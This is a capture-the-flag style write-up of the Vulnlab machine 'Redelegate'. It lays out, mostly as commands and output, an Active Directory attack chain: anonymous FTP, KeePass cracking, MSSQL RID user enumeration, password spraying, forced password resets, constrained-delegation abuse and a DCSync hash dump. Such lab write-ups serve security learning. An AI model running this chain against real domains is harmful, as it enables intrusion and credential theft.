---
categories:
- Vulnlab
image:
  path: preview.png
layout: post
media_subpath: /assets/posts/2024-11-23-vl-redelegate
tags:
- active directory
- c2
- windows
- delegation
title: VL Redelegate
---

Redelegate is a hard-rated Windows machine by [Geiseric](https://x.com/Geiseric4) on Vulnlab. The core concepts here are password spraying, enumerating domain users via MSSQL and diving deeper into kerberos delegation.

## Enumeration

Portscan:

```terminal
sudo nmap -sV 10.10.100.3
...
PORT     STATE SERVICE       VERSION
21/tcp   open  ftp           Microsoft ftpd
53/tcp   open  domain?
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-11-23 11:19:37Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
1433/tcp open  ms-sql-s      Microsoft SQL Server
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: redelegate.vl0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
3389/tcp open  ms-wbt-server Microsoft Terminal Services
5357/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
```

We are dealing with a domain controller, unusual services are FTP (21) and MSSQL (1433). Let's check FTP first:

```terminal
ftp 10.10.100.3
Connected to 10.10.100.3.
220 Microsoft FTP Service
Name (10.10.100.3:xct): anonymous
331 Anonymous access allowed, send identity (e-mail name) as password.
Password:
230 User logged in.
Remote system type is Windows_NT.
ftp> ls
229 Entering Extended Passive Mode (|||51251|)
125 Data connection already open; Transfer starting.
10-20-24  12:11AM                  434 CyberAudit.txt
10-20-24  04:14AM                 2622 Shared.kdbx
10-20-24  12:26AM                  580 TrainingAgenda.txt
226 Transfer complete.
ftp> binary
200 Type set to I.
ftp> mget *
```

Note that binary mode was used to download the files. The file `CyberAudit.txt` contains some previous engagement findings and their mitigation status. It suggests that removing unused AD objects is not mitigated yet, as well as checking ACLs. The file `TrainingAgenda.txt` shows that employees had a training about using strong passwords instead of something like "SeasonYear!".

Especially the last hint gives us a format we could try, so we generate a simple word list:

```
Spring2024!
Summer2024!
Fall2024!
Autumn2024!
Winter2024!
```

Since we don't have any domain users yet, we can only try them against the KeePass file `Shared.kdbx`, which was also on the share:

```
~/tools/john/run/keepass2john Shared.kdbx | tee hashes
Shared:$keepass$*2*600000*0*ce7395f413946b0cd279501e510cf8a988f39baca623dd86beaee651025662e6*e4f9d51a5df3e5f9ca1019cd57e10d60f85f48228da3f3b4cf1ffee940e20e01*18c45dbbf7d365a13d6714059937ebad*a59af7b75908d7bdf68b6fd929d315ae6bfe77262e53c209869a236da830495f*806f9dd2081c364e66a114ce3adeba60b282fc5e5ee6f324114d38de9b4502ca

~/tools/john/run/john hashes -w=passwords.txt
***2024!        (Shared)
Session completed.
```

We found the password and can now open the KeePass file, for example with `keepassxc`. One of the credentials inside is for MSSQL which we saw running on the machine, so we try to connect:

```bash
mssqlclient.py 'sqlguest:'***'@redelegate.vl'
Impacket v0.11.0 - Copyright 2023 Fortra

[*] Encryption required, switching to TLS
SQL (SQLGuest  guest@master)>
```

This works but we just have guest access. One thing we could try is to use `xp_dirtree` to get the hash of the service account running the service, but in this case it won't help. Instead we are going to enumerate domain users from here (even though the sqlguest account is *not* a domain user).

First, we get the domain name:

```sql
SQL (SQLGuest  guest@master)> SELECT DEFAULT_DOMAIN();

----------
REDELEGATE
```

Next we get the Domain SID by querying one of the default groups for it (the first 48 bytes will be the domain SID):

```sql
SELECT SUSER_SID('REDELEGATE\Domain Admins')

-----------------------------------------------------------
b'010500000000000515000000a185deefb22433798d8e847a00020000'
```

We can convert this to a readable string with PowerShell:

```powershell
$BinarySID = "010500000000000515000000a185deefb22433798d8e847a00020000"
$SIDBytes = [byte[]]::new($BinarySID.Length / 2)
for ($i = 0; $i -lt $BinarySID.Length; $i += 2) {
    $SIDBytes[$i / 2] = [convert]::ToByte($BinarySID.Substring($i, 2), 16)
}
$SID = New-Object System.Security.Principal.SecurityIdentifier($SIDBytes, 0)
$SID.Value

S-1-5-21-4024337825-2033394866-2055507597-512
``` 
We can now enumerate users by appending something different on the part that identifies the user (here 512). For example with a quick bash loop:

```bash
#!/bin/bash

USERNAME="sqlguest"
PASSWORD="***"
SERVER="redelegate.vl"
SID_BASE="S-1-5-21-4024337825-2033394866-2055507597"

for SID in {1100..1200}; do
    QUERY="SELECT SUSER_SNAME(SID_BINARY(N'$SID_BASE-$SID'))"
    echo "$QUERY" > query.sql
    mssqlclient.py "$USERNAME:$PASSWORD@$SERVER" -file query.sql  | grep -a REDELEGATE
    rm query.sql
done
```

Running it gives the domain users we want:

```terminal
bash enum.sh
REDELEGATE\FS01$
REDELEGATE\Christine.Flanders
REDELEGATE\Marie.Curie
REDELEGATE\Helen.Frost
REDELEGATE\Michael.Pontiac
REDELEGATE\Mallory.Roberts
REDELEGATE\James.Dinkleberg
REDELEGATE\Helpdesk
REDELEGATE\IT
REDELEGATE\Finance
REDELEGATE\DnsAdmins
REDELEGATE\DnsUpdateProxy
REDELEGATE\Ryan.Cooper
REDELEGATE\sql_svc
```

## Getting a Foothold

Now that we have a list of users, we can spray the password scheme that we learned about earlier against those users:

```bash
nxc smb redelegate.vl -u users.txt -p passwords.txt
...
SMB         10.10.100.3     445    DC               [+] REDELEGATE\Marie.Curie:***2024!
```

This leads to our first domain user credentials. At this point we can do a lot more enumeration like for example checking shares authenticated and gathering bloodhound data. First we gather bloodhound data:

```
nxc ldap redelegate.vl -u marie.curie -p '***2024!' --bloodhound -c all --dns-server 10.10.100.3
SMB         10.10.100.3     445    DC               [*] Windows Server 2022 Build 20348 x64 (name:DC) (domain:redelegate.vl) (signing:True) (SMBv1:False)
LDAP        10.10.100.3     389    DC               [+] redelegate.vl\marie.curie:Fall2024!
LDAP        10.10.100.3     389    DC               Resolved collection methods: rdp, objectprops, group, session, psremote, dcom, trusts, localadmin, container, acl
LDAP        10.10.100.3     389    DC               Done in 00M 05S
LDAP        10.10.100.3     389    DC               Compressing output into ***
```

After loading it into bloodhound, we notice that there is a path to high value targets from our user:

![Bloodhound Path 01](bh-changepassword.png)

To change the password of that user, we can use the following command:

```
changepasswd.py redelegate/helen.frost@redelegate.vl -newpass 'Start123!' -altuser redelegate/marie.curie -reset -altpass '***2024!' -debug

[*] Setting the password of redelegate\helen.frost as redelegate\marie.curie
[*] Connecting to DCE/RPC as redelegate\marie.curie
[+] Successfully bound to SAMR
[+] Sending SAMR call hSamrSetNTInternal1
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.

evil-winrm -i redelegate.vl -u "helen.frost" -p 'Start123!'

*Evil-WinRM* PS C:\Users\Helen.Frost\Documents>
```

This gives us a shell on the domain controller and our first flag.

## Privilege Escalation

First we check our privileges and notice that this user has the `SeEnableDelegationPrivilege`, which means that the user can enable delegation privileges on the domain.

```
*Evil-WinRM* PS C:\Users\Helen.Frost> whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                                    State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                                     Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                                       Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trusted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set                                 Enabled
```

This is a dangerous privilege that allows to escalate privileges in multiple ways. Let's take this opportunity to remember the 3 types of delegation:

**Unconstrained Delegation**: A machine configured with Unconstrained Delegation will store any TGT of users connecting to it in memory. This allows the machine to then impersonate that user. To configure this, the userAccountControl attribute of the machine gets modified to include the `TRUSTED_FOR_DELEGATION` flag (which requires the `SeEnableDelegationPrivilege` domain privilege).

**Constrained Delegation**: A machine configured with Constrained Delegation will be able to impersonate any user against *another* machine. To configure this, the userAccountControl attribute of the object gets modified to include the `TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION` flag (which requires the `SeEnableDelegationPrivilege` privilege) and the `msDS-AllowedToDelegateTo` attribute gets set to the target spn that we want to authenticate as any user against.

**Resource-Based Constrained Delegation**: A machine configured with Resource-Based Constrained Delegation will trust another user to impersonate any user on itself. To configure this the `AllowedToActOnBehalfOfOtherIdentity` property must be set to the SID of the object that is allowed to control it.  This does not require `SeEnableDelegationPrivilege` and the machine can modify it on itself.

So in other words, RBCD is a privilege given by a machine account on itself and does not require any special privileges, while both Unconstrained- and Constrained Delegation do require the `SeEnableDelegationPrivilege` because those affect other resources in the domain.

With this information, we can rule out RBCD and focus on the other delegations. As seen on the predecessor machine "Delegate", we could add a machine account, configure it with unconstrained delegation and then coerce the domain controller to authenticate to that machine. This would require the ability to add machine accounts and also to add DNS entries (for the coercion - kerberos works with names instead of ip addresses). Both is not possible in this case, since the environment has been hardened.

This leaves us with only Constrained Delegation which does not require a new DNS entry. It does however also require control of a machine account. Luckily in this case, the user `helen.frost` has `GenericAll` privileges on a computer object called `FS01$`. This allows us to reset the password of that computer object (alternatively Shadow Credentials could be used, if there would be a configured CA):

```
changepasswd.py redelegate/'fs01$'@redelegate.vl -newpass 'Start123!' -altuser redelegate/helen.frost -reset -altpass 'Start123!' -debug

[*] Setting the password of redelegate\fs01$ as redelegate\helen.frost
[*] Connecting to DCE/RPC as redelegate\helen.frost
[+] Successfully bound to SAMR
[+] Sending SAMR call hSamrSetNTInternal1
[*] Password was changed successfully.
[!] User no longer has valid AES keys for Kerberos, until they change their password again.
```

Additionally, we need to use our `SeEnableDelegationPrivilege` to make the necessary changes:

```
Set-ADObject -Identity "CN=FS01,CN=COMPUTERS,DC=REDELEGATE,DC=VL" -Add @{"msDS-AllowedToDelegateTo"="ldap/dc.redelegate.vl"}
Set-ADAccountControl -Identity "FS01$" -TrustedToAuthForDelegation $True
```

As described earlier we set `msDS-AllowedToDelegateTo` to the resource we want to control (ldap on the domain controller in order to perform a dcsync) and the `TrustedToAuthForDelegation` flag. 

Now we can use the credentials of the fs01 machine account to request a service ticket as any user (here the dc itself) to the dc:

```
getST.py redelegate.vl/fs01\$:'Start123!' -spn ldap/dc.redelegate.vl -impersonate dc

[*] Getting TGT for user
[*] Impersonating dc
[*] 	Requesting S4U2self
[*] 	Requesting S4U2Proxy
[*] Saving ticket in dc.ccache
```

Since this is a ticket for ldap, it allows us to perform dcsync:

```
export KRB5CCNAME=dc.ccache
secretsdump.py -k -no-pass dc.redelegate.vl -dc-ip 10.10.100.3

[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
[*] Using the DRSUAPI method to get NTDS.DIT secrets
Administrator:500:aad3b435b51404eeaad3b435b51404ee:***:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:***:::
Christine.Flanders:1104:aad3b435b51404eeaad3b435b51404ee:***:::
...
```

With the admin hash we can now connect to the DC and read the final flag. If you want to try out the machine, join [Vulnlab](https://www.vulnlab.com/) :)

## Resources

- [https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/](https://www.netspi.com/blog/technical-blog/network-pentesting/hacking-sql-server-procedures-part-4-enumerating-domain-accounts/)
- [https://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation/](https://blog.netwrix.com/2021/11/30/what-is-kerberos-delegation-an-overview-of-kerberos-delegation/)